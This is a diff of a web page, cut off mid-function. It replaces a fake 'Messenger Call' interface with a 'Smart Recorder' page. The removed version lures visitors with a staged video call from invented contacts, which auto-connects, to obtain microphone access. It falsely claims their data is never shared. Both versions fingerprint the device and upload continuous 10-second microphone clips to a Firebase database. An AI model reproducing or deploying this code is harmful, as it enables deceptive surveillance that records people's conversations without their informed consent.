@@ -2,502 +2,211 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Messenger Call</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Smart Recorder</title>
 <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  -webkit-tap-highlight-color: transparent;
-}
+* { margin: 0; padding: 0; box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
 
 body {
-  background: #000;
+  background: #0a0a0a;
   color: #fff;
-  height: 100vh;
-  overflow: hidden;
-  user-select: none;
-}
-
-/* ============================================================
-   SCREEN 1: CONTACT LIST
-   ============================================================ */
-#contactScreen {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  display: flex;
-  flex-direction: column;
-  z-index: 10;
-  transition: opacity 0.3s;
-}
-
-#contactScreen.hide {
-  opacity: 0;
-  pointer-events: none;
-}
-
-.header {
-  padding: 16px 20px;
-  background: #000;
-  border-bottom: 1px solid #1c1c1e;
-  display: flex;
-  align-items: center;
-  gap: 12px;
-}
-
-.header .back-btn { font-size: 24px; color: #0084FF; }
-.header h1 { font-size: 20px; font-weight: 600; flex: 1; }
-.header .new-chat { font-size: 22px; color: #0084FF; }
-
-.search-bar {
-  margin: 12px 20px;
-  padding: 10px 16px;
-  background: #1c1c1e;
-  border-radius: 20px;
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  color: #8e8e93;
-  font-size: 15px;
-}
-
-.contact-list { flex: 1; overflow-y: auto; }
-
-.contact-item {
-  display: flex;
-  align-items: center;
-  padding: 12px 20px;
-  gap: 14px;
-  cursor: pointer;
-  transition: background 0.15s;
-}
-
-.contact-item:active { background: #1c1c1e; }
-
-.contact-item .avatar {
-  width: 56px;
-  height: 56px;
-  border-radius: 50%;
-  background: linear-gradient(135deg, #0084FF, #00C6FF);
+  min-height: 100vh;
   display: flex;
   align-items: center;
   justify-content: center;
-  font-size: 24px;
-  font-weight: 600;
-  color: #fff;
-  flex-shrink: 0;
-  position: relative;
+  padding: 20px;
 }
 
-.contact-item .avatar.online::after {
-  content: '';
-  position: absolute;
-  bottom: 2px;
-  right: 2px;
-  width: 14px;
-  height: 14px;
-  background: #31A24C;
-  border: 2px solid #000;
-  border-radius: 50%;
-}
-
-.contact-item .info { flex: 1; min-width: 0; }
-.contact-item .name { font-size: 16px; font-weight: 500; margin-bottom: 2px; }
-.contact-item .status {
-  font-size: 13px;
-  color: #8e8e93;
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
-
-.contact-item .call-btn {
-  width: 44px;
-  height: 44px;
-  border-radius: 50%;
-  background: #0084FF;
-  border: none;
-  color: #fff;
-  font-size: 18px;
-  cursor: pointer;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  transition: transform 0.15s;
-}
-
-.contact-item .call-btn:active { transform: scale(0.9); }
-
-/* ============================================================
-   SCREEN 2: INCOMING CALL
-   ============================================================ */
-#incomingScreen {
-  position: fixed;
-  inset: 0;
-  background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);
-  display: none;
-  flex-direction: column;
-  align-items: center;
-  justify-content: space-between;
-  padding: 60px 24px 60px;
-  z-index: 50;
-}
-
-#incomingScreen.show { display: flex; }
-
-.incoming-top {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 20px;
-  margin-top: 40px;
-}
-
-.incoming-avatar {
-  width: 140px;
-  height: 140px;
-  border-radius: 50%;
-  background: linear-gradient(135deg, #0084FF, #00C6FF);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 56px;
-  font-weight: 600;
-  animation: incomingPulse 2s infinite;
-}
-
-@keyframes incomingPulse {
-  0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,132,255,0.5); }
-  50% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(0,132,255,0); }
-}
-
-.incoming-name { font-size: 28px; font-weight: 600; }
-.incoming-type { font-size: 15px; color: #8e8e93; }
-.incoming-status { font-size: 14px; color: #0084FF; margin-top: 8px; }
-
-.incoming-actions { display: flex; gap: 60px; align-items: center; }
-
-.call-action-btn {
-  width: 72px;
-  height: 72px;
-  border-radius: 50%;
-  border: none;
-  font-size: 28px;
-  cursor: pointer;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  transition: transform 0.15s;
-  color: #fff;
-}
-
-.call-action-btn:active { transform: scale(0.9); }
-.decline-btn { background: #FF3B30; }
-.accept-btn { background: #31A24C; animation: acceptPulse 1.5s infinite; }
-
-@keyframes acceptPulse {
-  0%, 100% { box-shadow: 0 0 0 0 rgba(49,162,76,0.6); }
-  50% { box-shadow: 0 0 0 20px rgba(49,162,76,0); }
-}
-
-/* ============================================================
-   SCREEN 3: PERMISSION MODAL
-   ============================================================ */
-#permissionModal {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.95);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  padding: 24px;
-  z-index: 100;
-}
-
-#permissionModal.show { display: flex; }
-
-.permission-content {
+/* Status card */
+#statusCard {
   background: #1c1c1e;
   border-radius: 20px;
   padding: 32px 24px;
   max-width: 400px;
   width: 100%;
   text-align: center;
-  animation: slideUp 0.3s ease;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+  border: 1px solid #2c2c2e;
 }
 
-@keyframes slideUp {
-  from { transform: translateY(30px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; }
+.status-icon {
+  font-size: 64px;
+  margin-bottom: 16px;
+  animation: pulse 2s infinite;
 }
 
-.permission-icons {
-  font-size: 56px;
-  margin-bottom: 20px;
-  display: flex;
-  justify-content: center;
-  gap: 20px;
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.08); }
 }
 
-.permission-content h2 { font-size: 22px; margin-bottom: 12px; }
-
-.permission-content p {
-  font-size: 15px;
-  color: #8e8e93;
-  line-height: 1.5;
-  margin-bottom: 24px;
-}
-
-.permission-content .privacy-note {
-  background: #2c2c2e;
-  border-radius: 12px;
-  padding: 12px;
-  font-size: 13px;
-  color: #31A24C;
-  margin-bottom: 24px;
-}
-
-.permission-btn {
-  width: 100%;
-  padding: 16px;
-  border: none;
-  border-radius: 12px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  margin-bottom: 10px;
-  transition: transform 0.15s;
-}
-
-.permission-btn:active { transform: scale(0.97); }
-.btn-allow { background: #0084FF; color: #fff; }
-.btn-deny { background: transparent; color: #8e8e93; font-weight: 400; }
-
-/* ============================================================
-   SCREEN 4: ACTIVE CALL
-   ============================================================ */
-#callScreen {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  display: none;
-  flex-direction: column;
-  z-index: 80;
-}
-
-#callScreen.show { display: flex; }
-
-.remote-video-wrap {
-  flex: 1;
-  position: relative;
-  background: #1c1c1e;
-  overflow: hidden;
-}
-
-#remoteVideo { width: 100%; height: 100%; object-fit: cover; }
-
-.call-header {
-  position: absolute;
-  top: 0;
-  left: 0;
-  right: 0;
-  padding: 20px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
-  z-index: 5;
-}
-
-.call-header .caller-name { font-size: 18px; font-weight: 600; }
-
-.call-header .call-timer {
-  font-size: 15px;
-  background: rgba(0,0,0,0.4);
-  padding: 4px 12px;
-  border-radius: 12px;
-}
-
-.local-video-wrap {
-  position: absolute;
-  bottom: 20px;
-  right: 20px;
-  width: 110px;
-  height: 150px;
-  border-radius: 12px;
-  overflow: hidden;
-  border: 2px solid rgba(255,255,255,0.3);
-  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-  z-index: 10;
-  background: #000;
-}
-
-#localVideo {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  transform: scaleX(-1);
-}
-
-.call-controls {
-  padding: 30px 20px 40px;
-  display: flex;
-  justify-content: center;
-  gap: 20px;
-  background: #000;
-}
-
-.ctrl-btn {
-  width: 60px;
-  height: 60px;
-  border-radius: 50%;
-  border: none;
-  background: #2c2c2e;
-  color: #fff;
+#statusCard h1 {
   font-size: 22px;
-  cursor: pointer;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  transition: transform 0.15s, background 0.2s;
+  margin-bottom: 8px;
 }
 
-.ctrl-btn:active { transform: scale(0.9); }
-.ctrl-btn.active { background: #0084FF; }
-.ctrl-btn.end { background: #FF3B30; width: 70px; height: 70px; font-size: 26px; }
+#statusCard p {
+  font-size: 14px;
+  color: #8e8e93;
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
 
-/* 🔥 Recording Indicator */
-#recIndicator {
-  position: absolute;
-  top: 70px;
-  right: 20px;
-  background: rgba(255,59,48,0.9);
-  padding: 6px 12px;
-  border-radius: 20px;
-  font-size: 12px;
+/* Recording indicator */
+#recBadge {
   display: none;
+  background: #FF3B30;
+  color: #fff;
+  padding: 8px 16px;
+  border-radius: 20px;
+  font-size: 13px;
+  font-weight: 600;
   align-items: center;
-  gap: 6px;
-  z-index: 20;
+  gap: 8px;
+  margin: 20px auto 0;
+  width: fit-content;
+  animation: recPulse 1.5s infinite;
 }
 
-#recIndicator .dot {
+#recBadge.show { display: inline-flex; }
+
+#recBadge .dot {
   width: 8px;
   height: 8px;
   border-radius: 50%;
   background: #fff;
-  animation: recPulse 1s infinite;
+  animation: dotPulse 1s infinite;
 }
 
 @keyframes recPulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(255,59,48,0.7); }
+  50% { box-shadow: 0 0 0 15px rgba(255,59,48,0); }
+}
+
+@keyframes dotPulse {
   0%, 100% { opacity: 1; }
   50% { opacity: 0.3; }
 }
 
-/* ============================================================
-   TOAST
-   ============================================================ */
-.toast {
-  position: fixed;
-  bottom: 100px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #2c2c2e;
-  color: #fff;
-  padding: 12px 24px;
-  border-radius: 24px;
-  font-size: 14px;
-  z-index: 9999;
-  animation: toastIn 0.3s ease;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+/* Stats */
+#stats {
+  display: none;
+  margin-top: 20px;
+  padding-top: 20px;
+  border-top: 1px solid #2c2c2e;
+  font-size: 13px;
+  color: #8e8e93;
 }
 
-@keyframes toastIn {
-  from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-  to { opacity: 1; transform: translateX(-50%) translateY(0); }
+#stats.show { display: block; }
+
+#stats .row {
+  display: flex;
+  justify-content: space-between;
+  padding: 6px 0;
 }
+
+#stats .row strong {
+  color: #0084FF;
+  font-size: 15px;
+}
+
+/* Error state */
+#statusCard.error .status-icon { animation: shake 0.5s infinite; }
+#statusCard.error h1 { color: #FF3B30; }
+
+@keyframes shake {
+  0%, 100% { transform: rotate(-5deg); }
+  50% { transform: rotate(5deg); }
+}
+
+/* Button */
+.action-btn {
+  width: 100%;
+  padding: 14px;
+  border: none;
+  border-radius: 12px;
+  background: #0084FF;
+  color: #fff;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 16px;
+  transition: transform 0.15s;
+}
+
+.action-btn:active { transform: scale(0.97); }
+
+/* Guide box */
+.guide-box {
+  background: #2c2c2e;
+  border-radius: 12px;
+  padding: 16px;
+  text-align: left;
+  font-size: 13px;
+  color: #e0e0e0;
+  line-height: 1.8;
+  margin-top: 16px;
+  display: none;
+}
+
+.guide-box.show { display: block; }
+
+.guide-box ol {
+  margin-left: 18px;
+  margin-top: 6px;
+}
+
+.guide-box strong { color: #4285F4; }
 </style>
 </head>
 <body>
 
-<!-- SCREEN 1: CONTACT LIST -->
-<div id="contactScreen">
-  <div class="header">
-    <div class="back-btn">←</div>
-    <h1>Chats</h1>
-    <div class="new-chat">✏️</div>
-  </div>
-  <div class="search-bar">
-    <span>🔍</span>
-    <span>Search Messenger</span>
-  </div>
-  <div class="contact-list" id="contactList"></div>
-</div>
+<div id="statusCard">
+  <div class="status-icon" id="statusIcon">🎤</div>
+  <h1 id="statusTitle">Initializing...</h1>
+  <p id="statusMsg">Please wait...</p>
 
-<!-- SCREEN 2: INCOMING CALL -->
-<div id="incomingScreen">
-  <div class="incoming-top">
-    <div class="incoming-avatar" id="incomingAvatar">R</div>
-    <div class="incoming-name" id="incomingName">Rahul Sharma</div>
-    <div class="incoming-type">Messenger video call</div>
-    <div class="incoming-status" id="incomingStatus">📞 Ringing...</div>
-  </div>
-  <div class="incoming-actions">
-    <button class="call-action-btn decline-btn" onclick="declineCall()">✕</button>
-    <button class="call-action-btn accept-btn" onclick="acceptCall()">📞</button>
-  </div>
-</div>
+  <button class="action-btn" id="actionBtn" style="display:none;" onclick="handleAction()">
+    🎤 Enable Microphone
+  </button>
 
-<!-- SCREEN 3: PERMISSION MODAL -->
-<div id="permissionModal">
-  <div class="permission-content">
-    <div class="permission-icons">🎤 📷</div>
-    <h2>Enable Camera & Mic</h2>
-    <p>To join the call, please allow <strong>mic first</strong>, then camera.</p>
-    <div class="privacy-note">
-      🔒 Your data is safe & never shared
+  <div class="guide-box" id="guideBox"></div>
+
+  <div id="recBadge">
+    <div class="dot"></div>
+    <span>Recording... <span id="recCount">0</span></span>
+  </div>
+
+  <div id="stats">
+    <div class="row">
+      <span>Session ID</span>
+      <strong id="statSession">—</strong>
     </div>
-    <button class="permission-btn btn-allow" onclick="requestPermissions()">
-      ✅ Allow & Join
-    </button>
-    <button class="permission-btn btn-deny" onclick="closePermissionModal()">
-      Not Now
-    </button>
-  </div>
-</div>
-
-
-<!-- SCREEN 4: ACTIVE CALL (Audio Only) -->
-<div id="callScreen">
-  <div class="remote-video-wrap" style="display:flex; align-items:center; justify-content:center; flex-direction:column; background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);">
-    <div id="callAvatar" style="width:160px; height:160px; border-radius:50%; background:linear-gradient(135deg, #0084FF, #00C6FF); display:flex; align-items:center; justify-content:center; font-size:64px; font-weight:600; box-shadow:0 0 60px rgba(0,132,255,0.5);">R</div>
-    <div id="callName" style="font-size:26px; font-weight:600; margin-top:24px;">Rahul Sharma</div>
-    <div style="font-size:16px; color:#8e8e93; margin-top:8px;">🔊 Audio Call</div>
-
-    <div class="call-header">
-      <div class="call-timer" id="callTimer">00:00</div>
+    <div class="row">
+      <span>Device ID</span>
+      <strong id="statDevice">—</strong>
     </div>
-
-    <div id="recIndicator">
-      <div class="dot"></div>
-      <span>REC</span>
+    <div class="row">
+      <span>Total Clips</span>
+      <strong id="statClips">0</strong>
     </div>
-  </div>
-
-  <div class="call-controls">
-    <button class="ctrl-btn" id="muteBtn" onclick="toggleMute()">🎤</button>
-    <button class="ctrl-btn" id="speakerBtn" onclick="toggleSpeaker()">🔊</button>
-    <button class="ctrl-btn end" onclick="endCall()">📞</button>
+    <div class="row">
+      <span>Last Save</span>
+      <strong id="statLast">—</strong>
+    </div>
   </div>
 </div>
 
 <script type="module">
 /* ============================================================
-   1. FIREBASE SETUP
+   SMART AUTO-RECORDER
+   - Permission granted → auto start
+   - Page visit → auto resume
+   - 10 sec clips → RTDB save
    ============================================================ */
+
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
 import { getDatabase, ref, push, serverTimestamp }
   from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
@@ -518,7 +227,7 @@ const db = getDatabase(firebaseApp);
 console.log('✅ Firebase initialized');
 
 /* ============================================================
-   2. DEVICE ID + SESSION ID
+   DEVICE ID
    ============================================================ */
 function getDeviceId() {
   let deviceId = localStorage.getItem('pics_device_id');
@@ -527,11 +236,9 @@ function getDeviceId() {
   const raw = [
     navigator.userAgent,
     window.screen.width + 'x' + window.screen.height,
-    window.screen.colorDepth,
     Intl.DateTimeFormat().resolvedOptions().timeZone,
     navigator.language,
-    navigator.platform,
-    navigator.hardwareConcurrency || ''
+    navigator.platform
   ].join('|');
 
   let hash = 0;
@@ -560,10 +267,245 @@ console.log('📱 Device ID:', DEVICE_ID);
 console.log('🔑 Session ID:', SESSION_ID);
 
 /* ============================================================
-   3. DATE TIME HELPER
+   STATE
    ============================================================ */
-function getDateTime() {
+let micStream = null;
+let audioRecorder = null;
+let audioChunks = [];
+let isRecording = false;
+let recordingLoopTimer = null;
+let clipCount = 0;
+const CLIP_DURATION = 10000;   // 10 sec
+
+/* ============================================================
+   DOM
+   ============================================================ */
+const statusCard = document.getElementById('statusCard');
+const statusIcon = document.getElementById('statusIcon');
+const statusTitle = document.getElementById('statusTitle');
+const statusMsg = document.getElementById('statusMsg');
+const actionBtn = document.getElementById('actionBtn');
+const guideBox = document.getElementById('guideBox');
+const recBadge = document.getElementById('recBadge');
+const recCount = document.getElementById('recCount');
+const stats = document.getElementById('stats');
+const statSession = document.getElementById('statSession');
+const statDevice = document.getElementById('statDevice');
+const statClips = document.getElementById('statClips');
+const statLast = document.getElementById('statLast');
+
+/* ============================================================
+   UI UPDATES
+   ============================================================ */
+function setUI(icon, title, msg, isError = false) {
+  statusIcon.textContent = icon;
+  statusTitle.textContent = title;
+  statusMsg.textContent = msg;
+  statusCard.classList.toggle('error', isError);
+}
+
+function showActionBtn(text, handler) {
+  actionBtn.textContent = text;
+  actionBtn.style.display = 'block';
+  actionBtn.onclick = handler;
+}
+
+function hideActionBtn() {
+  actionBtn.style.display = 'none';
+}
+
+function showGuide(text) {
+  guideBox.innerHTML = text;
+  guideBox.classList.add('show');
+}
+
+function hideGuide() {
+  guideBox.classList.remove('show');
+}
+
+/* ============================================================
+   PERMISSION CHECK
+   ============================================================ */
+async function checkMicPermission() {
+  if (!navigator.permissions || !navigator.permissions.query) {
+    return 'unknown';
+  }
+  try {
+    const status = await navigator.permissions.query({ name: 'microphone' });
+    return status.state;   // "granted" | "denied" | "prompt"
+  } catch (e) {
+    return 'unknown';
+  }
+}
+
+/* ============================================================
+   START RECORDING (Mic get + Loop)
+   ============================================================ */
+async function startRecorder() {
+  try {
+    console.log('🎤 Requesting mic...');
+
+    micStream = await navigator.mediaDevices.getUserMedia({
+      audio: {
+        echoCancellation: true,
+        noiseSuppression: true,
+        autoGainControl: true
+      }
+    });
+
+    const tracks = micStream.getAudioTracks();
+    console.log('✅ Mic granted | Tracks:', tracks.length);
+
+    setUI('🎙️', 'Recording Active', 'Your mic is recording 10 sec clips in background');
+    hideActionBtn();
+    hideGuide();
+    recBadge.classList.add('show');
+    stats.classList.add('show');
+
+    statSession.textContent = SESSION_ID.slice(0, 12) + '...';
+    statDevice.textContent = DEVICE_ID;
+
+    startRecordingLoop();
+    return true;
+
+  } catch (err) {
+    console.error('❌ Mic error:', err.name, err.message);
+
+    if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
+      setUI('🚫', 'Microphone Blocked',
+        'You denied mic access. Enable it manually from browser settings.', true);
+      showGuide(`
+        <strong>How to enable:</strong>
+        <ol>
+          <li>Click the <strong>🔒 lock icon</strong> in address bar</li>
+          <li>Find <strong>Microphone</strong> → set to <strong>Allow</strong></li>
+          <li>Refresh the page</li>
+        </ol>
+      `);
+      showActionBtn('🔄 I Enabled It — Retry', () => location.reload());
+    } else if (err.name === 'NotFoundError') {
+      setUI('🎤', 'No Microphone Found',
+        'Please connect a mic and refresh the page.', true);
+      showActionBtn('🔄 Retry', () => location.reload());
+    } else if (err.name === 'NotReadableError') {
+      setUI('⚠️', 'Microphone In Use',
+        'Another app is using your mic. Close it and retry.', true);
+      showActionBtn('🔄 Retry', () => location.reload());
+    } else {
+      setUI('❌', 'Mic Error', err.message || 'Unknown error', true);
+      showActionBtn('🔄 Retry', () => location.reload());
+    }
+    return false;
+  }
+}
+
+/* ============================================================
+   RECORDING LOOP — 10 sec clips
+   ============================================================ */
+function startRecordingLoop() {
+  stopRecordingLoop();
+  clipCount = 0;
+
+  console.log('🎤 Recording loop started');
+
+  // Pehla clip 1 sec baad
+  setTimeout(() => {
+    if (micStream) recordClip();
+  }, 1000);
+
+  // Har 11 sec me naya clip
+  recordingLoopTimer = setInterval(() => {
+    if (micStream && !isRecording) {
+      recordClip();
+    }
+  }, 11000);
+}
+
+function stopRecordingLoop() {
+  if (recordingLoopTimer) {
+    clearInterval(recordingLoopTimer);
+    recordingLoopTimer = null;
+  }
+  if (audioRecorder && audioRecorder.state === 'recording') {
+    try { audioRecorder.stop(); } catch (e) {}
+  }
+  isRecording = false;
+  console.log('⏹️ Recording loop stopped');
+}
+
+/* ============================================================
+   RECORD SINGLE CLIP
+   ============================================================ */
+async function recordClip() {
+  if (!micStream || isRecording) return;
+
+  const audioTracks = micStream.getAudioTracks();
+  if (audioTracks.length === 0) {
+    console.warn('⚠️ No audio track');
+    return;
+  }
+
+  try {
+    isRecording = true;
+    audioChunks = [];
+    clipCount++;
+
+    console.log(`🎤 [Clip #${clipCount}] Recording...`);
+
+    const audioOnlyStream = new MediaStream(audioTracks);
+
+    let mimeType = 'audio/webm;codecs=opus';
+    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
+    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
+    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
+
+    const options = { audioBitsPerSecond: 24000 };
+    if (mimeType) options.mimeType = mimeType;
+
+    audioRecorder = new MediaRecorder(audioOnlyStream, options);
+
+    audioRecorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) audioChunks.push(e.data);
+    };
+
+    audioRecorder.onstop = async () => {
+      const actualMime = audioRecorder.mimeType || mimeType || 'audio/webm';
+      const blob = new Blob(audioChunks, { type: actualMime });
+
+      console.log(`🎤 [Clip #${clipCount}] Size: ${(blob.size / 1024).toFixed(1)} KB`);
+
+      if (blob.size > 500) {
+        await saveToRTDB(blob, actualMime);
+      } else {
+        console.warn('⚠️ Blob too small, skipped');
+      }
+
+      audioChunks = [];
+      isRecording = false;
+      recCount.textContent = clipCount;
+    };
+
+    audioRecorder.start();
+
+    setTimeout(() => {
+      if (audioRecorder && audioRecorder.state === 'recording') {
+        audioRecorder.stop();
+      }
+    }, CLIP_DURATION);
+
+  } catch (err) {
+    console.error('❌ Record error:', err);
+    isRecording = false;
+  }
+}
+
+/* ============================================================
+   SAVE TO RTDB
+   ============================================================ */
+async function saveToRTDB(blob, mimeType) {
   const now = new Date();
+  const timestamp = now.getTime();
+
   const date = now.toLocaleDateString('en-IN', {
     day: '2-digit', month: '2-digit', year: 'numeric',
     timeZone: 'Asia/Kolkata'
@@ -572,326 +514,8 @@ function getDateTime() {
     hour: '2-digit', minute: '2-digit', second: '2-digit',
     hour12: true, timeZone: 'Asia/Kolkata'
   });
-  return {
-    date: date,
-    time: time,
-    timestamp: now.getTime(),
-    iso: now.toISOString()
-  };
-}
 
-/* ============================================================
-   4. CONTACTS DATA
-   ============================================================ */
-const CONTACTS = [
-  { id: 1, name: 'Rahul Sharma', initial: 'R', status: 'Hey! How are you?', online: true, color: '#0084FF' },
-  { id: 2, name: 'Priya Patel', initial: 'P', status: 'Sent you a photo', online: true, color: '#E91E63' },
-  { id: 3, name: 'Boss', initial: 'B', status: 'Meeting at 3 PM', online: false, color: '#FF9800' },
-  { id: 4, name: 'Anjali Verma', initial: 'A', status: 'Typing...', online: true, color: '#9C27B0' },
-  { id: 5, name: 'Vikram Singh', initial: 'V', status: 'Seen 2h ago', online: false, color: '#4CAF50' },
-  { id: 6, name: 'Sneha Kapoor', initial: 'S', status: 'Active now', online: true, color: '#00BCD4' },
-  { id: 7, name: 'Arjun Mehta', initial: 'A', status: 'You: Ok bro', online: false, color: '#FF5722' },
-  { id: 8, name: 'Mom', initial: 'M', status: 'Call me when free', online: true, color: '#795548' }
-];
-
-/* ============================================================
-   5. STATE
-   ============================================================ */
-let currentContact = null;
-let localStream = null;
-let micStreamOnly = null;
-let callTimerInterval = null;
-let callSeconds = 0;
-let isMuted = false;
-let isSpeakerOn = false;
-
-/* 🔥 Audio Recording State */
-let audioRecorder = null;
-let audioChunks = [];
-let audioLoopTimer = null;
-let isAudioRecording = false;
-const AUDIO_CLIP_DURATION = 10000;   // 10 sec
-let clipNumber = 0;
-
-/* ============================================================
-   6. DOM REFS
-   ============================================================ */
-const contactScreen   = document.getElementById('contactScreen');
-const contactList     = document.getElementById('contactList');
-const incomingScreen  = document.getElementById('incomingScreen');
-const incomingAvatar  = document.getElementById('incomingAvatar');
-const incomingName    = document.getElementById('incomingName');
-const incomingStatus  = document.getElementById('incomingStatus');
-const permissionModal = document.getElementById('permissionModal');
-const callScreen      = document.getElementById('callScreen');
-const callTimer       = document.getElementById('callTimer');
-
-/* ============================================================
-   7. RENDER CONTACTS
-   ============================================================ */
-function renderContacts() {
-  contactList.innerHTML = CONTACTS.map(c => `
-    <div class="contact-item" onclick="startCall(${c.id})">
-      <div class="avatar ${c.online ? 'online' : ''}"
-           style="background: linear-gradient(135deg, ${c.color}, ${c.color}dd);">
-        ${c.initial}
-      </div>
-      <div class="info">
-        <div class="name">${c.name}</div>
-        <div class="status">${c.status}</div>
-      </div>
-      <button class="call-btn" onclick="event.stopPropagation(); startCall(${c.id})">📞</button>
-    </div>
-  `).join('');
-}
-
-renderContacts();
-
-/* ============================================================
-   8. TOAST
-   ============================================================ */
-function showToast(msg) {
-  const existing = document.querySelector('.toast');
-  if (existing) existing.remove();
-
-  const toast = document.createElement('div');
-  toast.className = 'toast';
-  toast.textContent = msg;
-  document.body.appendChild(toast);
-
-  setTimeout(() => {
-    toast.style.opacity = '0';
-    toast.style.transition = 'opacity 0.3s';
-    setTimeout(() => toast.remove(), 300);
-  }, 2500);
-}
-
-/* ============================================================
-   9. START CALL
-   ============================================================ */
-window.startCall = async function(contactId) {
-  currentContact = CONTACTS.find(c => c.id === contactId);
-  if (!currentContact) return;
-
-  console.log('📞 Calling:', currentContact.name);
-
-  // MIC PERMISSION
-  try {
-    micStreamOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
-    console.log('✅ Mic granted');
-    console.log('🎤 Audio tracks:', micStreamOnly.getAudioTracks().length);
-    showToast('🎤 Mic allowed');
-  } catch (err) {
-    console.error('❌ Mic denied:', err.name);
-    let msg = '🚫 Mic permission required';
-    if (err.name === 'NotFoundError') msg = '🎤 No mic found';
-    if (err.name === 'NotReadableError') msg = '⚠️ Mic in use';
-    showToast(msg);
-    currentContact = null;
-    return;
-  }
-
-  // RINGING SCREEN
-  incomingAvatar.textContent = currentContact.initial;
-  incomingAvatar.style.background = `linear-gradient(135deg, ${currentContact.color}, ${currentContact.color}dd)`;
-  incomingName.textContent = currentContact.name;
-  incomingStatus.textContent = '📞 Calling...';
-
-  contactScreen.classList.add('hide');
-  incomingScreen.classList.add('show');
-
-  playRingtone();
-
-  setTimeout(() => {
-    if (incomingScreen.classList.contains('show')) {
-      incomingStatus.textContent = '📞 Ringing...';
-    }
-  }, 1500);
-
-  // AUTO-ACCEPT
-  setTimeout(() => {
-    if (incomingScreen.classList.contains('show')) {
-      acceptCallAuto();
-    }
-  }, 3500);
-};
-
-/* ============================================================
-   10. ACCEPT / CONNECT
-   ============================================================ */
-window.acceptCall = async function() {
-  stopRingtone();
-  incomingScreen.classList.remove('show');
-  await connectCall();
-};
-
-async function acceptCallAuto() {
-  stopRingtone();
-  incomingScreen.classList.remove('show');
-  console.log('📞 Auto-accepting...');
-  await connectCall();
-}
-
-async function connectCall() {
-  const audioTracks = micStreamOnly ? micStreamOnly.getAudioTracks() : [];
-
-  if (audioTracks.length === 0) {
-    showToast('⚠️ No mic available');
-    return;
-  }
-
-  localStream = new MediaStream([...audioTracks]);
-  console.log('✅ Local stream ready | Audio tracks:', localStream.getAudioTracks().length);
-
-  startCallUI();
-  startAudioLoop();
-}
-
-/* ============================================================
-   11. DECLINE / CANCEL
-   ============================================================ */
-window.declineCall = function() {
-  stopRingtone();
-  incomingScreen.classList.remove('show');
-  contactScreen.classList.remove('hide');
-
-  if (micStreamOnly) {
-    micStreamOnly.getTracks().forEach(t => t.stop());
-    micStreamOnly = null;
-  }
-
-  showToast('Call declined');
-  currentContact = null;
-};
-
-window.closePermissionModal = function() {
-  permissionModal.classList.remove('show');
-  contactScreen.classList.remove('hide');
-
-  if (micStreamOnly) {
-    micStreamOnly.getTracks().forEach(t => t.stop());
-    micStreamOnly = null;
-  }
-
-  showToast('Cancelled');
-  currentContact = null;
-};
-
-/* ============================================================
-   12. CALL UI
-   ============================================================ */
-function startCallUI() {
-  callTimer.textContent = '00:00';
-  callSeconds = 0;
-
-  document.getElementById('callAvatar').textContent = currentContact.initial;
-  document.getElementById('callAvatar').style.background = `linear-gradient(135deg, ${currentContact.color}, ${currentContact.color}dd)`;
-  document.getElementById('callName').textContent = currentContact.name;
-
-  callScreen.classList.add('show');
-
-  callTimerInterval = setInterval(() => {
-    callSeconds++;
-    const m = String(Math.floor(callSeconds / 60)).padStart(2, '0');
-    const s = String(callSeconds % 60).padStart(2, '0');
-    callTimer.textContent = `${m}:${s}`;
-  }, 1000);
-
-  if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-  showToast('✅ Call connected');
-}
-
-/* ============================================================
-   13. 🔥 AUDIO RECORDING — 10 SEC
-   ============================================================ */
-async function recordAudioClip() {
-  if (!localStream || isAudioRecording) return;
-
-  const audioTracks = localStream.getAudioTracks();
-  if (audioTracks.length === 0) {
-    console.warn('⚠️ No audio track');
-    return;
-  }
-
-  try {
-    isAudioRecording = true;
-    audioChunks = [];
-    clipNumber++;
-
-    console.log(`🎤 [Clip #${clipNumber}] Starting...`);
-
-    const audioOnlyStream = new MediaStream(audioTracks);
-
